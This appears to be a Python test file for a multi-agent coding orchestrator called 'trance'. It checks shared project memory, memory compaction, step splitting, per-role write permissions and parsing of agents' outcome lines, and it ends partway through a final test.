def test_the_prompt_view_is_bounded_and_keeps_the_newest(tmp_path):
    from trance.agents.memory import ProjectMemory

    memory = ProjectMemory(tmp_path)
    for i in range(60):
        memory.note("backend", f"decision number {i} " + "x" * 80)

    view = memory.for_prompt(budget=1000)
    assert len(view) <= 1100
    assert "decision number 59" in view          # newest survives
    assert "decision number 0 " not in view
    assert "older note(s) omitted" in view       # and says so


def test_remember_is_offered_to_working_agents_but_not_to_the_factchecker(tmp_path):
    tools = _tools(tmp_path, "backend")
    assert "remember" in {s["function"]["name"] for s in tools.specs()}

    checker = _tools(tmp_path, "factchecker")
    assert "remember" not in {s["function"]["name"] for s in checker.specs()}
    assert checker.call("remember", {"note": "x"}).ok is False


def test_an_agent_starts_with_what_the_team_already_decided(tmp_path, monkeypatch):
    from trance.agents import runner
    from trance.agents.memory import ProjectMemory
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    ProjectMemory(tmp_path).note("backend", "the API is POST /api/games")
    captured = {}

    class FakeClient:
        def complete(self, messages, tools=None, **kwargs):
            captured["prompt"] = messages[-1]["content"]
            return ChatResponse(text="OUTCOME: SUCCESS")

    monkeypatch.setattr(runner, "client_for", lambda config: FakeClient())
    runner.run_agent(role=BUILTIN_ROLES["frontend"], task="call the API", project=tmp_path,
                     config=ModelConfig(), bus=EventBus(), session_id="s", step_id="st")

    assert "POST /api/games" in captured["prompt"]
    assert "Project memory" in captured["prompt"]


# ----------------------------------------------- making the graph usable

def test_the_project_map_lists_what_is_indexed(tmp_path):
    from trance.db import GraphDB
    from trance.indexer.service import index_repo
    from trance.worker.tools import project_map

    (tmp_path / "app.py").write_text("def charge(order):\n    return 1\n\nclass Cart:\n    pass\n")
    db = GraphDB(tmp_path / "g.db")
    index_repo(tmp_path, db)

    text = project_map(db)
    assert "app.py" in text and "charge" in text and "Cart" in text


def test_the_map_is_bounded_and_says_what_it_left_out(tmp_path):
    from trance.db import GraphDB
    from trance.indexer.service import index_repo
    from trance.worker.tools import project_map

    for i in range(40):
        (tmp_path / f"mod{i}.py").write_text(f"def f{i}():\n    return {i}\n")
    db = GraphDB(tmp_path / "g.db")
    index_repo(tmp_path, db)

    text = project_map(db, budget_chars=300)
    assert len(text) < 500
    assert "more file(s)" in text and "search_symbols" in text


def test_the_map_puts_the_files_the_task_names_first(tmp_path):
    from trance.db import GraphDB
    from trance.indexer.service import index_repo
    from trance.worker.tools import project_map

    (tmp_path / "aaa.py").write_text("def first():\n    pass\n")
    (tmp_path / "zzz.py").write_text("def last():\n    pass\n")
    db = GraphDB(tmp_path / "g.db")
    index_repo(tmp_path, db)

    text = project_map(db, focus="fix the bounce logic in zzz.py please")
    assert text.splitlines()[0].startswith("zzz.py")


def test_an_agent_is_shown_the_map_before_it_starts_reading(tmp_path, monkeypatch):
    """Regression: agents ignored the graph tools entirely and read whole files,
    because nothing told them which symbols existed to ask for."""
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    captured = {}

    class FakeClient:
        def complete(self, messages, tools=None, **kwargs):
            captured["prompt"] = messages[-1]["content"]
            return ChatResponse(text="OUTCOME: SUCCESS")

    monkeypatch.setattr(runner, "client_for", lambda config: FakeClient())
    runner.run_agent(role=BUILTIN_ROLES["backend"], task="add an endpoint", project=tmp_path,
                     config=ModelConfig(), bus=EventBus(), session_id="s", step_id="st",
                     project_map="server/app.py: create_app, register_routes")

    assert "create_app" in captured["prompt"]
    assert "get_definition" in captured["prompt"]     # and what to do with it


def test_the_memory_endpoint_shows_and_edits_what_agents_see(tmp_path, monkeypatch):
    """A wrong shared fact misleads every later agent, so it must be fixable."""
    from fastapi.testclient import TestClient

    from trance.agents.memory import ProjectMemory
    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))

    project = tmp_path / "proj"
    project.mkdir()
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]
    ProjectMemory(project).note("backend", "the server listens on port 9999")

    body = client.get(f"/api/sessions/{sid}/memory").json()
    assert "9999" in body["raw"] and len(body["notes"]) == 1

    client.put(f"/api/sessions/{sid}/memory",
               json={"raw": "- **user**: the server listens on port 3100\n"})
    assert "3100" in ProjectMemory(project).for_prompt()


def test_memory_is_in_every_request_of_a_turn(tmp_path, monkeypatch):
    """Not just the opening prompt: a long tool loop must not drift away from
    the team's decisions."""
    from trance.agents import runner
    from trance.agents.memory import ProjectMemory
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse, ToolCall

    ProjectMemory(tmp_path).note("backend", "the API is POST /api/games")
    seen = []

    class Looper:
        def __init__(self):
            self.n = 0

        def complete(self, messages, tools=None, **kwargs):
            self.n += 1
            seen.append("\n".join(str(m.get("content")) for m in messages))
            if self.n < 4:
                return ChatResponse(text="", tool_calls=[
                    ToolCall(id=f"c{self.n}", name="list_files", arguments={})])
            return ChatResponse(text="OUTCOME: SUCCESS")

    monkeypatch.setattr(runner, "client_for", lambda config: Looper())
    runner.run_agent(role=BUILTIN_ROLES["frontend"], task="build the ui", project=tmp_path,
                     config=ModelConfig(), bus=EventBus(), session_id="s", step_id="st")

    assert len(seen) == 5          # 4 rounds, plus the end-of-step memory nudge
    assert all("POST /api/games" in prompt for prompt in seen)


def test_the_verifier_sees_the_same_memory_as_the_worker(tmp_path, monkeypatch):
    """A checker judging against different facts than the worker built to is
    just a second opinion about the wrong thing."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "factchecker"])
    engine.memory.note("backend", "the server listens on port 3100")
    step = Step(role="backend", task="build it", check="factchecker")
    prompts = {}

    def fake(**kw):
        prompts[kw["role"].name] = (kw.get("memory") or engine.memory).for_prompt()
        return _Turn("PASS", "done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert "3100" in prompts["backend"]
    assert "3100" in prompts["factchecker"]


def test_the_orchestrator_plans_against_the_teams_decisions(tmp_path, monkeypatch):
    from trance.agents import orchestrator
    from trance.agents.memory import ProjectMemory
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    ProjectMemory(tmp_path).note("backend", "the server listens on port 3100")
    captured = {}

    class FakeClient:
        def complete(self, messages, tools=None, **kwargs):
            captured["system"] = messages[0]["content"]
            return ChatResponse(text="ok")

    monkeypatch.setattr(orchestrator, "client_for", lambda config: FakeClient())
    orchestrator.chat(messages=[{"role": "user", "content": "add a scoreboard"}],
                      project_dir=tmp_path, config=ModelConfig(), bus=EventBus(),
                      session_id="s")

    assert "3100" in captured["system"]
    assert "already decided" in captured["system"]


# --------------------------------- making every step update the memory

def _turn_with(monkeypatch, replies, role="backend", project=None, **kw):
    """Drive run_agent with a scripted sequence of model replies."""
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus

    prompts = []

    class Scripted:
        def __init__(self):
            self.n = 0

        def complete(self, messages, tools=None, **kwargs):
            prompts.append(str(messages[-1].get("content")))
            reply = replies[min(self.n, len(replies) - 1)]
            self.n += 1
            return reply

    monkeypatch.setattr(runner, "client_for", lambda config: Scripted())
    turn = runner.run_agent(role=BUILTIN_ROLES[role], task="do it", project=project,
                            config=ModelConfig(), bus=EventBus(),
                            session_id="s", step_id="st", **kw)
    return turn, prompts


def test_an_agent_that_did_work_is_asked_what_to_remember(tmp_path, monkeypatch):
    """Asking after the step is over is too late — the agent is gone."""
    from trance.providers.base import ChatResponse, ToolCall

    replies = [
        ChatResponse(text="", tool_calls=[ToolCall(
            id="c1", name="write_file",
            arguments={"path": "server/app.py", "content": "x = 1\n"})]),
        ChatResponse(text="Wrote the app.\n\nOUTCOME: SUCCESS"),
        ChatResponse(text="", tool_calls=[ToolCall(
            id="c2", name="remember",
            arguments={"note": "the API is POST /api/games"})]),
        ChatResponse(text="OUTCOME: SUCCESS"),
    ]
    turn, prompts = _turn_with(monkeypatch, replies, project=tmp_path)

    nudge = next(p for p in prompts if "is there a fact the next agent must match" in p)
    assert "server/app.py" in nudge          # names what it actually wrote
    assert "holds 0 note(s)" in nudge        # and closes the "already covered" excuse
    assert turn.notes_written == 1
    assert turn.outcome[0] == "SUCCESS"          # the outcome survives the nudge

    from trance.agents.memory import ProjectMemory
    assert "POST /api/games" in ProjectMemory(tmp_path).for_prompt()


def test_the_nudge_happens_once_and_takes_no_for_an_answer(tmp_path, monkeypatch):
    from trance.providers.base import ChatResponse, ToolCall

    replies = [
        ChatResponse(text="", tool_calls=[ToolCall(
            id="c1", name="write_file",
            arguments={"path": "server/app.py", "content": "x = 1\n"})]),
        ChatResponse(text="Done.\n\nOUTCOME: SUCCESS"),
        ChatResponse(text="Nothing the others need.\n\nOUTCOME: SUCCESS"),
    ]
    turn, prompts = _turn_with(monkeypatch, replies, project=tmp_path)

    asked = sum("is there a fact the next agent must match" in p for p in prompts)
    assert asked == 1                            # not once per round
    assert turn.notes_written == 0
    assert turn.outcome[0] == "SUCCESS"


def test_an_agent_that_already_remembered_is_not_asked(tmp_path, monkeypatch):
    from trance.providers.base import ChatResponse, ToolCall

    replies = [
        ChatResponse(text="", tool_calls=[ToolCall(
            id="c1", name="remember", arguments={"note": "the port is 3100"})]),
        ChatResponse(text="Done.\n\nOUTCOME: SUCCESS"),
    ]
    turn, prompts = _turn_with(monkeypatch, replies, project=tmp_path)

    assert not any("is there a fact the next agent must match" in p for p in prompts)
    assert turn.notes_written == 1


def test_an_agent_that_did_nothing_is_not_asked(tmp_path, monkeypatch):
    """No work, nothing to hand over — the extra round would be pure cost."""
    from trance.providers.base import ChatResponse

    turn, prompts = _turn_with(monkeypatch, [ChatResponse(text="OUTCOME: FAILED — blocked")],
                               project=tmp_path)
    assert not any("is there a fact the next agent must match" in p for p in prompts)
    assert turn.rounds == 1


# ------------------------------------------ keeping the memory small

def _fill(memory, n, prefix="fact"):
    for i in range(n):
        memory.note("backend", f"{prefix} number {i} that the team must follow")


def test_memory_is_compacted_once_it_outgrows_every_prompt(tmp_path):
    from trance.agents.memory import ProjectMemory

    memory = ProjectMemory(tmp_path)
    _fill(memory, 30)
    assert memory.oversized() is True

    result = memory.compact(lambda text: "- **backend**: the ports are 3100 and 3101\n"
                                         "- **backend**: routes live under /api")
    assert result["compacted"] is True and result["before"] == 30 and result["after"] == 2
    assert len(memory.notes()) == 2
    assert "3100" in memory.for_prompt()
    assert memory.oversized() is False


def test_compaction_archives_what_it_replaced(tmp_path):
    """A memory you cannot audit is worse than a long one — the agents were
    told those facts, and a run gets debugged after it goes wrong."""
    from trance.agents.memory import ProjectMemory

    memory = ProjectMemory(tmp_path)
    _fill(memory, 30)
    memory.compact(lambda text: "- **backend**: everything is fine")

    archive = (tmp_path / ".trance" / "memory.archive.md").read_text()
    assert "fact number 0" in archive and "fact number 29" in archive
    assert "Compacted from 30 to 1 notes" in archive


def test_a_rewrite_that_loses_the_notes_is_refused(tmp_path):
    from trance.agents.memory import ProjectMemory

    memory = ProjectMemory(tmp_path)
    _fill(memory, 30)

    for bad in ("", "Sure! Here is a summary of the project.", "   "):
        result = memory.compact(lambda text, b=bad: b)
        assert result["compacted"] is False
        assert len(memory.notes()) == 30          # untouched


def test_a_rewrite_that_grew_is_refused(tmp_path):
    from trance.agents.memory import ProjectMemory

    memory = ProjectMemory(tmp_path)
    _fill(memory, 30)
    result = memory.compact(lambda text: "\n".join(f"- note {i}" for i in range(60)))
    assert result["compacted"] is False and len(memory.notes()) == 30


def test_a_failing_rewrite_leaves_the_memory_alone(tmp_path):
    """The endpoint being down must not cost the team its shared facts."""
    from trance.agents.memory import ProjectMemory

    def explode(text):
        raise RuntimeError("connection refused")

    memory = ProjectMemory(tmp_path)
    _fill(memory, 30)
    result = memory.compact(explode)
    assert result["compacted"] is False and "connection refused" in result["reason"]
    assert len(memory.notes()) == 30


def test_a_small_memory_is_left_alone(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])
    engine.memory.note("backend", "the port is 3100")
    called = []
    monkeypatch.setattr(engine.memory, "compact", lambda *a, **k: called.append(1) or {})

    engine._compact_memory()
    assert called == []


def test_the_engine_compacts_between_steps_not_during_one(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])
    _fill(engine.memory, 30)
    seen = []

    def fake(**kw):
        seen.append(len(engine.memory.notes()))
        return _Turn(None, "done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    monkeypatch.setattr(engine.memory, "compact",
                        lambda rewrite: {"compacted": True, "before": 30, "after": 2})

    engine._execute(Step(role="backend", task="t"))
    assert seen == [30]        # the step ran against a stable memory


def test_compaction_can_be_triggered_from_the_ui(tmp_path, monkeypatch):
    from fastapi.testclient import TestClient

    from trance.agents.memory import ProjectMemory
    from trance.config import Config
    from trance.providers.base import ChatResponse
    from trance.server import app as app_module

    monkeypatch.setattr(app_module, "client_for", lambda config: type(
        "C", (), {"complete": lambda self, messages, tools=None, **kwargs: ChatResponse(
            text="- **backend**: the API is POST /api/games on port 3100")})())

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))

    project = tmp_path / "proj"
    project.mkdir()
    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(project)}).json()["id"]
    memory = ProjectMemory(project)
    _fill(memory, 30)
    assert client.get(f"/api/sessions/{sid}/memory").json()["oversized"] is True

    body = client.post(f"/api/sessions/{sid}/memory/compact").json()
    assert body["compacted"] is True and body["after"] == 1
    assert client.get(f"/api/sessions/{sid}/memory").json()["oversized"] is False


# ------------------------------------- sizing steps and splitting big ones

def _proposal(*points):
    return {"summary": "s", "team": ["backend"],
            "steps": [{"role": "backend", "task": f"task worth {p}", "check": "factchecker",
                       "on_fail": None, "max_loops": 2, "points": p} for p in points]}


def _split_client(monkeypatch, pieces_by_task):
    """An orchestrator that answers split_step with a scripted breakdown."""
    from trance.agents import orchestrator
    from trance.providers.base import ChatResponse, ToolCall

    asked = []

    class FakeClient:
        def complete(self, messages, tools=None, **kwargs):
            task = messages[-1]["content"].split("Task: ", 1)[-1].split("\n")[0]
            asked.append(task)
            pieces = pieces_by_task.get(task, [])
            return ChatResponse(text="", tool_calls=[ToolCall(
                id="c", name="split_step", arguments={"steps": pieces})])

    monkeypatch.setattr(orchestrator, "client_for", lambda config: FakeClient())
    return asked


def test_the_estimate_is_snapped_to_the_scale():
    from trance.agents.orchestrator import _points

    assert _points(8) == 8
    assert _points(4) == 3        # 4 is equidistant; the smaller claim is the safer one
    assert _points(100) == 13
    assert _points("nonsense") == 0
    assert _points(0) == 0


def test_a_step_over_the_threshold_is_broken_up(tmp_path, monkeypatch):
    from trance.agents.orchestrator import split_oversized
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.config import ModelConfig
    from trance.events import EventBus

    asked = _split_client(monkeypatch, {"task worth 8": [
        {"role": "backend", "task": "write the model layer", "points": 3},
        {"role": "backend", "task": "write the routes on top of it", "points": 3},
    ]})
    out = split_oversized(_proposal(2, 8), roles=list(R.values()),
                          config=ModelConfig(), bus=EventBus(), session_id="s", threshold=5)

    assert asked == ["task worth 8"]                 # only the oversized one
    assert [s["task"] for s in out["steps"]] == [
        "task worth 2", "write the model layer", "write the routes on top of it"]
    assert all(s["points"] <= 5 for s in out["steps"])


def test_a_split_piece_inherits_the_check_it_was_given(tmp_path, monkeypatch):
    """Splitting a checked step into unchecked ones would quietly remove the
    verification the user asked for."""
    from trance.agents.orchestrator import split_oversized
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.config import ModelConfig
    from trance.events import EventBus

    _split_client(monkeypatch, {"task worth 8": [
        {"role": "backend", "task": "part one", "points": 3},
        {"role": "backend", "task": "part two", "points": 2},
    ]})
    out = split_oversized(_proposal(8), roles=list(R.values()), config=ModelConfig(),
                          bus=EventBus(), session_id="s", threshold=5)

    assert [s["check"] for s in out["steps"]] == ["factchecker", "factchecker"]


def test_a_step_that_cannot_be_split_is_kept(monkeypatch):
    """A refusal is information — forcing a break would invent filler steps."""
    from trance.agents.orchestrator import split_oversized
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.config import ModelConfig
    from trance.events import EventBus

    _split_client(monkeypatch, {"task worth 13": [
        {"role": "backend", "task": "task worth 13", "points": 13}]})
    out = split_oversized(_proposal(13), roles=list(R.values()), config=ModelConfig(),
                          bus=EventBus(), session_id="s", threshold=5)

    assert len(out["steps"]) == 1
    assert out["steps"][0]["task"] == "task worth 13"


def test_splitting_recurses_but_stops(monkeypatch):
    """Each pass halves; two passes is enough, and past that models pad."""
    from trance.agents.orchestrator import split_oversized
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.config import ModelConfig
    from trance.events import EventBus

    asked = _split_client(monkeypatch, {
        "task worth 13": [{"role": "backend", "task": "still big", "points": 8},
                          {"role": "backend", "task": "small bit", "points": 2}],
        "still big": [{"role": "backend", "task": "half a", "points": 3},
                      {"role": "backend", "task": "half b", "points": 3}],
    })
    out = split_oversized(_proposal(13), roles=list(R.values()), config=ModelConfig(),
                          bus=EventBus(), session_id="s", threshold=5)

    assert asked == ["task worth 13", "still big"]
    assert [s["task"] for s in out["steps"]] == ["half a", "half b", "small bit"]


def test_a_zero_threshold_turns_splitting_off(monkeypatch):
    from trance.agents.orchestrator import split_oversized
    from trance.agents.roles import BUILTIN_ROLES as R
    from trance.config import ModelConfig
    from trance.events import EventBus

    asked = _split_client(monkeypatch, {})
    out = split_oversized(_proposal(13, 8), roles=list(R.values()), config=ModelConfig(),
                          bus=EventBus(), session_id="s", threshold=0)
    assert asked == [] and len(out["steps"]) == 2      # estimates kept as information


def test_the_estimate_survives_into_the_flow():
    from trance.flow import Step

    step = Step.from_dict({"role": "backend", "task": "t", "points": 5})
    assert step.points == 5 and step.to_dict()["points"] == 5


def test_the_split_threshold_is_configurable_and_can_be_turned_off(tmp_path):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.server import app as app_module

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))

    assert client.get("/api/config").json()["planning"]["max_step_points"] == 5

    assert client.put("/api/config/planning",
                      json={"max_step_points": 3}).json()["max_step_points"] == 3
    assert client.put("/api/config/planning",
                      json={"max_step_points": 0}).json()["max_step_points"] == 0
    assert client.put("/api/config/planning", json={"max_step_points": 99}).status_code == 400


def test_a_step_can_be_split_from_the_flow_editor(tmp_path, monkeypatch):
    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.providers.base import ChatResponse, ToolCall
    from trance.server import app as app_module

    class FakeClient:
        def complete(self, messages, tools=None, **kwargs):
            return ChatResponse(text="", tool_calls=[ToolCall(
                id="c", name="split_step", arguments={"steps": [
                    {"role": "backend", "task": "write the model layer", "points": 3},
                    {"role": "backend", "task": "write the routes", "points": 2}]})])

    monkeypatch.setattr("trance.agents.orchestrator.client_for", lambda config: FakeClient())
    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))

    sid = client.post("/api/sessions",
                      json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
    client.put(f"/api/sessions/{sid}/flow", json={"steps": [
        {"role": "backend", "task": "build the whole api", "points": 8},
        {"role": "tester", "task": "test it", "points": 2}]})

    session = client.app.state.store.get(sid)
    step_id = session.flow.steps[0].id
    body = client.post(f"/api/sessions/{sid}/steps/{step_id}/split").json()

    assert body["split"] is True
    assert [s["task"] for s in body["flow"]["steps"]] == [
        "write the model layer", "write the routes", "test it"]   # in place, order kept


def test_the_plan_is_returned_before_the_splitting_finishes(tmp_path, monkeypatch):
    """Regression: splitting ran inside the chat request, so a proposal that
    needed two 40-second split calls left the flow panel saying 'no steps yet'
    with no explanation."""
    import threading

    from fastapi.testclient import TestClient

    from trance.config import Config
    from trance.providers.base import ChatResponse, ToolCall
    from trance.server import app as app_module

    splitting = threading.Event()
    proposal = {"summary": "s", "team": ["backend"], "steps": [
        {"role": "backend", "task": "build the whole api", "points": 8},
        {"role": "backend", "task": "add a health check", "points": 1}]}

    def fake_chat(**kw):
        return {"text": "here is the plan", "proposal": proposal, "truncated": False}

    def slow_split(*args, **kwargs):
        splitting.wait(5)                     # still working when we assert
        return {**proposal, "split": []}

    monkeypatch.setattr(app_module.orchestrator_agent, "chat", fake_chat)
    monkeypatch.setattr(app_module.orchestrator_agent, "split_oversized", slow_split)

    config = Config.load(tmp_path / "none.toml")
    config.runs_dir = str(tmp_path / "runs")
    client = TestClient(app_module.create_app(config, tmp_path / "sessions"))
    try:
        sid = client.post("/api/sessions",
                          json={"name": "p", "project_dir": str(tmp_path / "proj")}).json()["id"]
        body = client.post(f"/api/sessions/{sid}/chat", json={"message": "build it"}).json()

        # The plan is there straight away, unsplit, rather than after the wait.
        assert [s["task"] for s in body["flow"]["steps"]] == [
            "build the whole api", "add a health check"]
        assert body["status"] == "ready"
    finally:
        splitting.set()


def test_an_agent_is_told_the_goal_and_what_its_task_is_not(tmp_path, monkeypatch):
    """An agent that does not know the goal makes locally sensible, globally
    wrong choices — an API shape nothing downstream can use."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "frontend", "tester"])
    engine.session.goal = "A crypto backtester with TradingView charts."
    engine.session.flow.steps = [
        Step(role="backend", task="write the OHLC loader", id="s1"),
        Step(role="frontend", task="draw the chart", id="s2"),
        Step(role="tester", task="test the loader", id="s3"),
    ]
    prompts = {}

    def fake(**kw):
        prompts[kw["role"].name] = (kw.get("goal", ""), kw.get("placement", ""))
        return _Turn(None, "done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(engine.session.flow.steps[0])

    goal, placement = prompts["backend"]
    assert "crypto backtester" in goal
    assert "step 1 of 3" in placement
    assert "draw the chart" in placement          # it knows what it must serve
    assert "not\nto you" in placement or "not to you" in placement.replace("\n", " ")
    assert "Do not start it" in placement


def test_the_last_step_is_told_it_is_the_last(tmp_path, monkeypatch):
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])
    engine.session.flow.steps = [Step(role="backend", task="finish it", id="s1")]
    seen = {}

    def fake(**kw):
        seen["placement"] = kw.get("placement", "")
        return _Turn(None, "done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(engine.session.flow.steps[0])
    assert "last step" in seen["placement"]
    assert "finished state" in seen["placement"]


def test_only_the_next_two_steps_are_shown(tmp_path, monkeypatch):
    """The whole list is an invitation to do someone else's step; the next
    couple is orientation."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])
    engine.session.flow.steps = [
        Step(role="backend", task=f"task {i}", id=f"s{i}") for i in range(6)]
    seen = {}

    def fake(**kw):
        seen["placement"] = kw.get("placement", "")
        return _Turn(None, "done", outcome=("SUCCESS", ""))

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(engine.session.flow.steps[0])

    assert "task 1" in seen["placement"] and "task 2" in seen["placement"]
    assert "task 3" not in seen["placement"]


def test_the_goal_survives_a_restart(tmp_path):
    from trance.session import SessionStore

    store = SessionStore(tmp_path)
    session = store.create("p", "/tmp/p")
    session.goal = "A crypto backtester."
    store.save(session)
    assert SessionStore(tmp_path).get(session.id).goal == "A crypto backtester."


def test_the_plan_is_written_where_a_person_can_read_it(tmp_path):
    from trance.agents.memory import write_plan
    from trance.flow import Step

    path = write_plan(tmp_path, "A crypto backtester.", [
        Step(role="backend", task="write the loader", points=3, check="factchecker",
             status="done"),
        Step(role="frontend", task="draw the chart", points=5),
    ])
    text = path.read_text()

    assert path.name == "PLAN.md" and path.parent.name == ".trance"
    assert "A crypto backtester." in text
    assert "[x]" in text and "write the loader" in text     # progress is visible
    assert "checked by factchecker" in text
    # Never the project's own README: that belongs to whoever reads the repo.
    assert not (tmp_path / "README.md").exists()


# --------------------------- files that belong to nobody: the devops agent

def test_the_scaffolding_files_have_an_owner():
    """Regression: a step asked backend to create package.json and .gitignore.
    Neither was in any agent's remit, so every write was refused and the run
    halted after burning its loop limit."""
    devops = BUILTIN_ROLES["devops"]
    for path in ["package.json", ".gitignore", "README.md", "Dockerfile",
                 "tsconfig.json", "requirements.txt", ".github/workflows/ci.yml"]:
        assert devops.may_write(path), path


def test_devops_does_not_become_a_way_around_every_remit():
    """A role that may write anything is a bypass the orchestrator will reach
    for the moment a step is awkward."""
    devops = BUILTIN_ROLES["devops"]
    for path in ["server/routes/data.js", "src/App.tsx", "services/binance.js",
                 "tests/test_api.py"]:
        assert not devops.may_write(path), path


def test_the_orchestrator_is_told_what_each_agent_may_write(tmp_path, monkeypatch):
    """It cannot plan around a remit it cannot see — which is how a scaffolding
    task got assigned to backend."""
    from trance.agents import orchestrator
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    captured = {}

    class FakeClient:
        def complete(self, messages, tools=None, **kwargs):
            captured["system"] = messages[0]["content"]
            return ChatResponse(text="ok")

    monkeypatch.setattr(orchestrator, "client_for", lambda config: FakeClient())
    orchestrator.chat(messages=[{"role": "user", "content": "build a node app"}],
                      project_dir=tmp_path, config=ModelConfig(), bus=EventBus(),
                      session_id="s")

    assert "may write: package.json" in captured["system"]
    assert "REFUSED by the system" in captured["system"]
    assert "devops" in captured["system"]


def test_a_step_refused_by_the_remit_says_who_owns_the_files(tmp_path, monkeypatch):
    """'Raise the loop limit' is the wrong advice when the writes are refused
    rather than failing — no number of loops makes them land."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend", "devops"])
    step = Step(role="backend", task="create package.json and .gitignore", max_loops=2)

    def fake(**kw):
        turn = _Turn(None, "could not write them", outcome=("FAILED", "refused"))
        turn.remit_violations = ["package.json", ".gitignore"]
        return turn

    monkeypatch.setattr("trance.engine.run_agent", fake)
    engine._execute(step)

    assert step.status == "failed"
    halted = next(e for e in engine.bus.history(engine.session.id)
                  if e.type == "run_halted")
    assert "package.json" in halted.payload["message"]
    assert "devops owns" in halted.payload["hint"]
    assert "Looping cannot fix this" in halted.payload["hint"]


def test_the_owner_is_found_even_when_it_is_not_on_the_team(tmp_path, monkeypatch):
    """Answering 'unassigned' when the answer is 'add devops' helps nobody."""
    from trance.flow import Step

    engine = _engine(tmp_path, ["backend"])          # no devops on this team
    assert engine._owner_of(".gitignore") == "devops"
    assert engine._owner_of("server/app.js") == "backend"
    assert engine._owner_of("nothing/owns/this.weird") is None


def test_a_manifest_has_exactly_one_owner():
    """Two owners for package.json is how a dependency gets added by one agent
    and overwritten by the other."""
    owners = [name for name, role in BUILTIN_ROLES.items() if role.may_write("package.json")]
    assert owners == ["devops"]


def test_an_empty_memory_says_so_rather_than_being_hidden(tmp_path, monkeypatch):
    """Regression: the section was omitted when empty, so an agent could not
    tell 'nothing recorded' from 'not shown' — one declined to write a note
    because 'the existing memory notes already cover' it, with none existing."""
    from trance.agents import runner
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    captured = {}

    class FakeClient:
        def complete(self, messages, tools=None, **kwargs):
            captured["prompt"] = messages[-1]["content"]
            return ChatResponse(text="OUTCOME: SUCCESS")

    monkeypatch.setattr(runner, "client_for", lambda config: FakeClient())
    runner.run_agent(role=BUILTIN_ROLES["backend"], task="t", project=tmp_path,
                     config=ModelConfig(), bus=EventBus(), session_id="s", step_id="st")

    assert "## Project memory" in captured["prompt"]
    assert "empty — nothing has been written down yet" in captured["prompt"]


def test_memory_is_shown_before_the_toolset(tmp_path, monkeypatch):
    """The decisions constrain the work; the toolset only constrains how."""
    from trance.agents import runner
    from trance.agents.memory import ProjectMemory
    from trance.config import ModelConfig
    from trance.events import EventBus
    from trance.providers.base import ChatResponse

    ProjectMemory(tmp_path).note("backend", "the port is 3100")
    captured = {}

    class FakeClient:
        def complete(self, messages, tools=None, **kwargs):
            captured["prompt"] = messages[-1]["content"]
            return ChatResponse(text="OUTCOME: SUCCESS")

    monkeypatch.setattr(runner, "client_for", lambda config: FakeClient())
    runner.run_agent(role=BUILTIN_ROLES["backend"], task="t", project=tmp_path,
                     config=ModelConfig(), bus=EventBus(), session_id="s", step_id="st")

    prompt = captured["prompt"]
    assert prompt.index("## Project memory") < prompt.index("## Your permissions")
    assert prompt.index("## Your task") < prompt.index("## Project memory")


# -------------------------- an outcome line that states neither verdict

def test_a_success_worded_without_the_keyword_is_not_read_as_failure():
    """Regression: "OUTCOME: Verified index.html is complete and correct — no
    changes needed" was filed as FAILED with itself as the reason, so a step
    that went fine looped and eventually halted the run."""
    from trance.agents.runner import AgentTurn

    turn = AgentTurn(text="OUTCOME: Verified `server/public/index.html` is complete "
                          "and correct — no changes needed.")
    state, detail = turn.outcome
    assert state == "UNCLEAR"          # not FAILED, and not silently SUCCESS
    assert turn.needs_outcome is True


def test_common_synonyms_are_accepted_without_another_round():
    from trance.agents.runner import AgentTurn

    for line in ["OUTCOME: SUCCESS", "OUTCOME: DONE", "OUTCOME: Complete",
                 "OUTCOME: ok", "OUTCOME: PASSED", "OUTCOME: SUCCESS — with a note"]:
        assert AgentTurn(text=line).outcome[0] == "SUCCESS", line

    for line in ["OUTCOME: FAILED — port taken", "OUTCOME: ERROR", "OUTCOME: blocked",
                 "OUTCOME: incomplete — ran out of time"]:
        assert AgentTurn(text=line).outcome[0] == "FAILED", line


def test_a_verdict_word_only_counts_as_the_first_word():
    """"the feature is not complete" contains "complete"; reading that as
    success is the one mistake this mechanism exists to prevent."""
